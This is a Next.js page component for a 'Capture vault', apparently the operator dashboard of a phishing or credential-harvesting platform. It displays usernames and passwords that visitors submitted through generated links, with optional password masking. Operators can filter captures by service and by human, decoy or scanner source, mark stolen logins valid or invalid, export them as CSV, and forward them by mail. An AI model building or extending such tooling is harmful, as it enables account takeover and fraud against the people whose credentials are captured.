import { redirect } from "next/navigation";
import { requirePageSession } from "../../server/session";
import { listServices } from "../../server/services";
import {
  countCaptures,
  forwardCapture,
  listCaptures,
  setCaptureStatus,
} from "../../server/vault";
import { getOrg } from "../../server/account";
import { CopyButton } from "../../components/copy";
import { Empty, PageHeader, StatusPill, shortTime } from "../../components/ui";

export default async function Vault({
  searchParams,
}: {
  searchParams: Promise<Record<string, string | undefined>>;
}) {
  const session = await requirePageSession();
  const params = await searchParams;
  const filter = {
    serviceId: params.service || undefined,
    status: params.status || undefined,
    source: params.source || undefined,
    q: params.q || undefined,
  };
  const [org, services, captures, counts] = await Promise.all([
    getOrg(session),
    listServices(session),
    listCaptures(session, { ...filter, limit: 60 }),
    countCaptures(session, filter),
  ]);
  const mask = org.settings.maskPasswords;
  const query = new URLSearchParams(
    Object.entries(filter).filter(([, value]) => Boolean(value)) as [string, string][],
  ).toString();

  async function mark(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    await setCaptureStatus(
      ctx,
      String(formData.get("captureId") ?? ""),
      String(formData.get("status") ?? "new"),
    );
    redirect(`/vault?${query}`);
  }

  async function forward(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    await forwardCapture(ctx, String(formData.get("captureId") ?? ""));
    redirect(`/vault?${query}&forwarded=1`);
  }

  return (
    <main className="app" id="content">
      <PageHeader
        title="Capture vault"
        lede="Every credential the platform has stored for this org, newest first. Plaintext lives here and in forwarded mail only."
        actions={
          <a className="btn ghost" href={`/api/vault/export?${query}`}>
            Export CSV
          </a>
        }
      />

      <div className="tiles" style={{ marginBottom: "1.1rem" }}>
        <div className="tile">
          <strong>{counts.total}</strong>
          <span className="muted">matching</span>
        </div>
        <div className="tile">
          <strong>{counts.new}</strong>
          <span className="muted">new</span>
        </div>
        <div className="tile">
          <strong>{counts.valid}</strong>
          <span className="muted">valid</span>
        </div>
        <div className="tile">
          <strong>{counts.invalid}</strong>
          <span className="muted">invalid</span>
        </div>
      </div>

      <form method="get" className="card" style={{ marginBottom: "1.1rem" }}>
        <div className="field-row">
          <div className="field">
            <label htmlFor="q">Search</label>
            <input
              id="q"
              name="q"
              defaultValue={params.q}
              placeholder="username or slug"
            />
          </div>
          <div className="field">
            <label htmlFor="service">Service</label>
            <select id="service" name="service" defaultValue={params.service ?? ""}>
              <option value="">All services</option>
              {services.map((service) => (
                <option key={service.id} value={service.id}>
                  {service.serviceType} · {service.tier}
                </option>
              ))}
            </select>
          </div>
          <div className="field">
            <label htmlFor="status">Status</label>
            <select id="status" name="status" defaultValue={params.status ?? "all"}>
              <option value="all">Any</option>
              <option value="new">New</option>
              <option value="valid">Valid</option>
              <option value="invalid">Invalid</option>
            </select>
          </div>
          <div className="field">
            <label htmlFor="source">Source</label>
            <select id="source" name="source" defaultValue={params.source ?? "all"}>
              <option value="all">Any</option>
              <option value="human">Human</option>
              <option value="decoy">Decoy</option>
              <option value="scanner">Scanner</option>
            </select>
          </div>
        </div>
        <div className="actions">
          <button type="submit" className="btn">
            Apply
          </button>
          <a className="btn ghost" href="/vault">
            Reset
          </a>
          <span className="fine">
            Masking is {mask ? "on" : "off"} — change it in Configuration.
          </span>
        </div>
      </form>

      {params.forwarded ? <p className="ok">Capture queued for mail.</p> : null}

      {captures.length === 0 ? (
        <Empty title="Nothing here yet">
          Captures appear the moment a visitor submits a link. Try the filters above, or
          create a link on a service.
        </Empty>
      ) : (
        <div className="stack">
          {captures.map((capture) => (
            <article className="card" key={capture.id}>
              <div className="row">
                <div>
                  <strong className="mono">
                    {String(capture.fields.username ?? "unknown")}
                  </strong>
                  <div className="fine">
                    {capture.serviceType} · {capture.hostname ?? "no host"}/
                    {capture.slug ?? "—"} · {shortTime(capture.receivedAt)} ·{" "}
                    {capture.source}
                  </div>
                </div>
                <StatusPill status={capture.status} />
              </div>

              <dl className="kv" style={{ marginTop: "0.8rem" }}>
                {Object.entries(capture.fields).map(([key, value]) => {
                  const text =
                    typeof value === "object" ? JSON.stringify(value) : String(value);
                  const hidden = mask && /pass/i.test(key);
                  return (
                    <div key={key} style={{ display: "contents" }}>
                      <dt>{key}</dt>
                      <dd>
                        <span className="mono">
                          {hidden ? "•".repeat(Math.min(text.length, 14)) : text}
                        </span>
                        <CopyButton value={text} label="Copy" />
                      </dd>
                    </div>
                  );
                })}
              </dl>

              <div className="actions" style={{ marginTop: "0.8rem" }}>
                <form action={mark}>
                  <input type="hidden" name="captureId" value={capture.id} />
                  <input type="hidden" name="status" value="valid" />
                  <button type="submit" className="btn sm">
                    Mark valid
                  </button>
                </form>
                <form action={mark}>
                  <input type="hidden" name="captureId" value={capture.id} />
                  <input type="hidden" name="status" value="invalid" />
                  <button type="submit" className="btn ghost sm">
                    Mark invalid
                  </button>
                </form>
                <form action={forward}>
                  <input type="hidden" name="captureId" value={capture.id} />
                  <button type="submit" className="btn ghost sm">
                    Mail it
                  </button>
                </form>
              </div>
            </article>
          ))}
        </div>
      )}
    </main>
  );
}
